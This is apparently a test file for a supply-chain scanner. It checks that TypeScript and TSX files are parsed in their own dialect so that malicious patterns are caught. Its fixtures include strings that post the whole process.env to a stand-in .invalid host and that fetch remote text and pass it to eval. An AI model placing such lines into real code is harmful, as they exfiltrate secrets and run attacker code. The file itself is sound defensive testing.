// TS-STRIP (0.1.9, rule set 2.93.0): a TypeScript file is read by the supply-chain tests in its own dialect. Twin of
// python/tests/scanner/test_typescript_dialect.py: the engine was handed a .ts or .tsx file's text alone, read it as
// JavaScript first, and so read `post<object>(url, process.env)` as two comparisons (nothing found) and refused a
// .tsx file's `!` and `as` (no reading was TypeScript with JSX). Each call that reaches the tree now takes the file's
// name, and the engine its `dialect`.
// Everything is inert text: hosts are .invalid, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { importTimeRisk, installScriptRisk, importTimeSeverity, jsDialect, jsRefusal } from "../src/index.js";
import { dialectArgs } from "../src/lib/native.js";
import { depFileIssues } from "../src/deps.js";

const JSX = "\nexport const el = <div className=\"x\">hi</div>;\n";
const ENV_SENT = "reads credentials or the whole environment and sends data over the network";
const SEND = "import { post } from 'axios';\npost<object>('https://x.invalid/c', process.env);\n";

test("the dialect of a file's name", () => {
  for (const [path, dialect] of [["a.ts", "ts"], ["src/a.MTS", "ts"], ["a.cts", "ts"], ["App.tsx", "tsx"],
    ["a.js", null], ["a.mjs", null], ["a.cjs", null], ["a.jsx", null], ["bin/cli", null], [null, null]]) {
    assert.equal(jsDialect(path), dialect, String(path));
    assert.deepEqual(dialectArgs(path), dialect ? { dialect } : {}, String(path));
  }
});

test("a .tsx file's TypeScript syntax is read", () => {
  const vite = "import ReactDOM from 'react-dom/client'\nimport App from './App.tsx'\n"
    + "ReactDOM.createRoot(document.getElementById('root')!).render(<App />)\n";
  for (const text of [vite, "const x = (window as any).foo;" + JSX, "enum Color { Red }" + JSX,
    "const [xs, setXs] = useState<number[]>([]);" + JSX, "const m = new Map<string, number>();" + JSX,
    "let x!: number;" + JSX, "export const el = <List<string> items={[]} />;\n"]) {
    assert.notEqual(jsRefusal(text), null, text);              // a text whose file is not known: as before
    assert.equal(jsRefusal(text, "src/App.tsx"), null, text);
  }
  // JSX is no TypeScript in a .ts file: refused at its line, as tsc refuses it
  const view = "const a = 1;\nexport const el = <div>hi</div>;\n";
  assert.equal(jsRefusal(view), null);
  assert.equal(jsRefusal(view, "a.ts")[0], 2);
});

test("a call given a type is a call in a TypeScript file, and two comparisons in a JavaScript one", () => {
  for (const path of ["index.ts", "index.mts", "index.cts", "App.tsx"]) {
    assert.deepEqual(importTimeRisk(SEND, "js", null, path)[0], [ENV_SENT], path);
  }
  assert.equal(importTimeSeverity([ENV_SENT]), "CRITICAL");
  for (const path of [null, "index.js", "index.mjs", "index.jsx"]) {
    assert.deepEqual(importTimeRisk(SEND, "js", null, path), [[], null], String(path));
  }
  const run = "function getJSON<T>(u: string) { return fetch(u).then((r) => r.text()); }\n"
    + "getJSON<string>('https://x.invalid/p').then(eval);\n";
  assert.deepEqual(importTimeRisk(run, "js", null, "load.ts")[0], ["runs code it receives over the network"]);
  assert.deepEqual(installScriptRisk(SEND, true, false, "js", null, "scripts/setup.ts"),
    ["sends environment variables over the network (the whole environment)"]);
  assert.deepEqual(installScriptRisk(SEND, true, false, "js", null, "scripts/setup.js"), []);
  // --deps: a dependency's file no hook runs
  const [found] = depFileIssues("node_modules/x/index.ts", SEND, "js");
  assert.equal(found.rule, "SC-IMPORT-RISK");
  assert.equal(depFileIssues("node_modules/x/index.js", SEND, "js")[0], null);
});
